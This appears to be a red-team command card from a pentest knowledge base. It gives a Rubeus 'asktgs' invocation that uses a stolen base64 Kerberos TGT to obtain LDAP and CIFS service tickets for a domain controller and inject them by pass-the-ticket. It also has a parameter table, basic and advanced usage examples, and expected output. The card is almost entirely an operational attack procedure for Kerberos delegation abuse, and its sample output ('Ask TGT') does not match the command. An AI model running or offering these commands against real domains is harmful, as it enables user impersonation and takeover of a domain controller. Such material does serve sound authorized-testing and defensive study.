---
type: command
executor: powershell
data: >-
  .\Rubeus.exe asktgs /ticket:<ticket base64>
  /service:LDAP/dc.lab.local,cifs/dc.lab.local /ptt
output: null
created_at: '2023-04-06T03:56:07.584722+00:00'
updated_at: '2023-04-10T20:25:48.071449+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - delegation
verified: true
validated: true
---

# Rubeus Asktgs for DC Services

## Command

```powershell
.\Rubeus.exe asktgs /ticket:<ticket base64> /service:LDAP/dc.lab.local,cifs/dc.lab.local /ptt
```

## Description

This command uses Rubeus to request TGS tickets for LDAP and CIFS services on a domain controller using a provided base64-encoded TGT, then injects them via pass-the-ticket (/ptt). It is used in Kerberos delegation abuse scenarios to impersonate users to DC services.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /ticket:<ticket base64> | Base64-encoded TGT obtained from prior coercion or extraction | Yes |
| /service:LDAP/dc.lab.local,cifs/dc.lab.local | Services and target DC FQDN for impersonation | Yes |
| /ptt | Inject tickets into current session | Yes |

## Examples

### Basic Usage

```powershell
.\Rubeus.exe asktgs /ticket:BASE64TGT /service:LDAP/dc.lab.local /ptt
```

### Advanced Usage

```powershell
.\Rubeus.exe asktgs /ticket:BASE64TGT /service:LDAP/dc.lab.local,cifs/dc.lab.local,HTTP/webserver.lab.local /ptt
```

## Expected Output

Successful execution shows:

[*] Action: Ask TGT
[*] Ticket: ** PASS THE TICKET ** (injected)
[>] TGT: <base64 ticket>

No errors indicate successful injection; verify with `klist`.

## Related

- [[Abuse Kerberos Unconstrained Delegation via SpoolService]]
- [[tools/Rubeus]]
